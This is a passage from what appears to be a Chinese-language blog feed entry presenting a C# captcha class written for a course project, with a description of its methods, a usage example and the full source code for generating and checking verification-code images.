<span class=\"keyword\">this</span>.width = width;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.height = height;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SecurityCode</span>(<span class=\"params\"><span class=\"built_in\">int</span> length</span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.length = length;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.width = (length + <span class=\"number\">1</span>) * <span class=\"number\">25</span>;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.height = <span class=\"number\">40</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//随机生成验证码字符串</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">CreateVerificationText</span>(<span class=\"params\"><span class=\"built_in\">int</span> length</span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            VerificationText = <span class=\"built_in\">string</span>.Empty;</span><br><span class=\"line\">            <span class=\"built_in\">string</span> dictionary = <span class=\"string\">&quot;ABCDEFGHIJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789&quot;</span>;<span class=\"comment\">//去除O,o,0 ,l,1</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; length; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"built_in\">int</span> index = rand.Next(<span class=\"number\">0</span>, dictionary.Length);</span><br><span class=\"line\">                VerificationText += dictionary[index].ToString();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//刷新验证码</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">UpdateVerifyCode</span>()</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            CreateVerificationText(length);</span><br><span class=\"line\">            CreateImage();</span><br><span class=\"line\">            <span class=\"comment\">//Console.WriteLine(MD5Encrypt(VerificationText));//Only for test</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//生成验证码图片</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">CreateImage</span>()</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            map = <span class=\"keyword\">new</span> Bitmap(width, height);</span><br><span class=\"line\">            Graphics g = Graphics.FromImage(map);</span><br><span class=\"line\">            Pen pen = <span class=\"keyword\">new</span> Pen(Color.Black);</span><br><span class=\"line\">            <span class=\"built_in\">string</span>[] font = &#123; <span class=\"string\">&quot;Verdana&quot;</span>, <span class=\"string\">&quot;Microsoft Sans Serif&quot;</span>, <span class=\"string\">&quot;Consolas&quot;</span>, <span class=\"string\">&quot;Arial&quot;</span>, <span class=\"string\">&quot;宋体&quot;</span> &#125;;</span><br><span class=\"line\">            Font f = <span class=\"keyword\">new</span> Font(<span class=\"string\">&quot;Arial&quot;</span>, <span class=\"number\">20</span>, FontStyle.Bold);</span><br><span class=\"line\">            g.Clear(Color.White);</span><br><span class=\"line\">            SolidBrush brush = <span class=\"keyword\">new</span> SolidBrush(Color.White);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//绘制干扰线条</span></span><br><span class=\"line\">            pen.Width = <span class=\"number\">0.1F</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">15</span>; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                pen.Color = RandColor();</span><br><span class=\"line\">                g.DrawLine(pen, RandPoint(), RandPoint());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//绘制干扰点</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">80</span>; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Point p = RandPoint();</span><br><span class=\"line\">                map.SetPixel(p.X, p.Y, RandColor());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//绘制字符串</span></span><br><span class=\"line\">            SizeF  StringSizeF = g.MeasureString(VerificationText, f);</span><br><span class=\"line\">            PointF StartPoint = <span class=\"keyword\">new</span> Point(<span class=\"number\">0</span>, (height - (<span class=\"built_in\">int</span>)StringSizeF.Height) / <span class=\"number\">2</span>);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; length; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                brush.Color = RandColor();</span><br><span class=\"line\">                <span class=\"built_in\">int</span> index = rand.Next(<span class=\"number\">5</span>);</span><br><span class=\"line\">                f = <span class=\"keyword\">new</span> Font(font[index], <span class=\"number\">20</span>, FontStyle.Bold);</span><br><span class=\"line\">                StartPoint.X += <span class=\"number\">5</span>;</span><br><span class=\"line\">                g.DrawString(VerificationText[i].ToString(), f, brush, StartPoint);</span><br><span class=\"line\">                SizeF CharSizeF = g.MeasureString(VerificationText[i].ToString(), f);</span><br><span class=\"line\">                StartPoint.X += CharSizeF.Width;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            g.Dispose();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//生成随机颜色</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> Color <span class=\"title\">RandColor</span>()</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Color c = Color.FromArgb(rand.Next(<span class=\"number\">1</span>, <span class=\"number\">256</span>), rand.Next(<span class=\"number\">1</span>, <span class=\"number\">255</span>), rand.Next(<span class=\"number\">1</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">            <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//生成随机点</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> Point <span class=\"title\">RandPoint</span>()</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">int</span> x = rand.Next(<span class=\"number\">0</span>, map.Width);</span><br><span class=\"line\">            <span class=\"built_in\">int</span> y = rand.Next(<span class=\"number\">0</span>, map.Height);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Point(x, y);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//返回验证码图片</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Bitmap <span class=\"title\">getImage</span>()</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> map;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//返回经MD5加密过的验证码字符串</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"built_in\">string</span> <span class=\"title\">MD5Encrypt</span>()</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Tool.MD5Encrypt(VerificationText);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//返回校验结果</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"built_in\">bool</span> <span class=\"title\">Check</span>(<span class=\"params\"><span class=\"built_in\">string</span> text</span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> text.ToUpper().Equals(VerificationText.ToUpper());<span class=\"comment\">//不区分大小写</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"前言最近写C#课程设计时，登录验证处需用到验证码，于是参照网上博客，自己封装了一个验证码类，和网上其他博客相比，有以下优点: 去除了0,o,O与1,l等容易混淆的字符 使用方便，仅需三行代码 内置有返回MD5加密后的字符串的方法，便于前端调用 函数说明公有方法 SecurityCode(int length);&#x2F;&#x2F;构造函数 SecurityCode(int length, int width, int height);&#x2F;&#x2F;构造函数 void UpdateVerifyCode();&#x2F;&#x2F;刷新验证码 Bitmap getImage();&#x2F;&#x2F;返回验证码图片 string MD5Encrypt();&#x2F;&#x2F;返回经MD5加密过的验证码字符串 bool Check(string text);&#x2F;&#x2F;返回校验结果(不区分大小写) 私有方法 void CreateVerificationText(int length);&#x2F;&#x2F;随机生成验证码字符串 void CreateImage();&#x2F;&#x2F;生成验证码图片 Color RandColor();&#x2F;&#x2F;生成随机颜色 Point RandPoint();&#x2F;&#x2F;生成随机点 使用示例123SecurityCode Code=new SecurityCode(4);code.UpdateVerifyCode();picturebox.Image=code.getImage(); 效果图 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111class SecurityCode&#123; private Random rand = new Random();//生成随机数 private string VerificationText = string.Empty;//验证码字符串 private Bitmap map;//验证码的位图 private int length;//验证码的字符个数 private int width;//验证码图片的宽度 private int height;//验证码图片的高度 public SecurityCode(int length, int width, int height) &#123; this.length = length; this.width = width; this.height = height; &#125; public SecurityCode(int length) &#123; this.length = length; this.width = (length + 1) * 25; this.height = 40; &#125; //随机生成验证码字符串 private void CreateVerificationText(int length) &#123; VerificationText = string.Empty; string dictionary = &quot;ABCDEFGHIJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789&quot;;//去除O,o,0 ,l,1 for (int i = 0; i &lt; length; i++) &#123; int index = rand.Next(0, dictionary.Length); VerificationText += dictionary[index].ToString(); &#125; &#125; //刷新验证码 public void UpdateVerifyCode() &#123; CreateVerificationText(length); CreateImage(); //Console.WriteLine(MD5Encrypt(VerificationText));//Only for test &#125; //生成验证码图片 private void CreateImage() &#123; map = new Bitmap(width, height); Graphics g = Graphics.FromImage(map); Pen pen = new Pen(Color.Black); string[] font = &#123; &quot;Verdana&quot;, &quot;Microsoft Sans Serif&quot;, &quot;Consolas&quot;, &quot;Arial&quot;, &quot;宋体&quot; &#125;; Font f = new Font(&quot;Arial&quot;, 20, FontStyle.Bold); g.Clear(Color.White); SolidBrush brush = new SolidBrush(Color.White); //绘制干扰线条 pen.Width = 0.1F; for (int i = 0; i &lt; 15; i++) &#123; pen.Color = RandColor(); g.DrawLine(pen, RandPoint(), RandPoint()); &#125; //绘制干扰点 for (int i = 0; i &lt; 80; i++) &#123; Point p = RandPoint(); map.SetPixel(p.X, p.Y, RandColor()); &#125; //绘制字符串 SizeF StringSizeF = g.MeasureString(VerificationText, f); PointF StartPoint = new Point(0, (height - (int)StringSizeF.Height) / 2); for (int i = 0; i &lt; length; i++) &#123; brush.Color = RandColor(); int index = rand.Next(5); f = new Font(font[index], 20, FontStyle.Bold); StartPoint.X += 5; g.DrawString(VerificationText[i].ToString(), f, brush, StartPoint); SizeF CharSizeF = g.MeasureString(VerificationText[i].ToString(), f); StartPoint.X += CharSizeF.Width; &#125; g.Dispose(); &#125; //生成随机颜色 private Color RandColor() &#123; Color c = Color.FromArgb(rand.Next(1, 256), rand.Next(1, 255), rand.Next(1, 255)); return c; &#125; //生成随机点 private Point RandPoint() &#123; int x = rand.Next(0, map.Width); int y = rand.Next(0, map.Height); return new Point(x, y); &#125; //返回验证码图片 public Bitmap getImage() &#123; return map; &#125; //返回经MD5加密过的验证码字符串 public string MD5Encrypt() &#123; return Tool.MD5Encrypt(VerificationText); &#125; //返回校验结果 public bool Check(string text) &#123; return text.ToUpper().Equals(VerificationText.ToUpper());//不区分大小写 &#125;&#125;","summary":"前言最近写C#课程设计时，登录验证处需用到验证码，于是参照网上博客，自己封装了一个验证码类，和网上其他博客相比，有以下优点: 去除了0,o,O与1,l等容易混淆的字符 使用方便，仅需三行代码 内置有返回MD5加密后的字符串的方法，便于前端调用","date_published":"2018-06-18T18:41:13.000Z","tags":["C#","C#",".NET"]}]}